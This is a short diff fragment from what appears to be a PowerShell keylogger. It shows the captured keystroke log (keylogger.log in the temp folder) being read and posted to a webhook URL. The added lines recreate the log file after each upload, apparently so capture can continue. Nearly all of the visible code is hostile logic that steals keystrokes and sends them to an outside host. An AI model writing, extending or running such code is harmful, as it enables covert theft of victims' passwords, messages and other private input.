@@ -11,6 +11,8 @@
         'content' = get-content $env:temp/keylogger.log
         }
       Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body
+
+      $generateLog = New-Item -Path $env:temp/keylogger.log -ItemType File -Force
      }
 
 
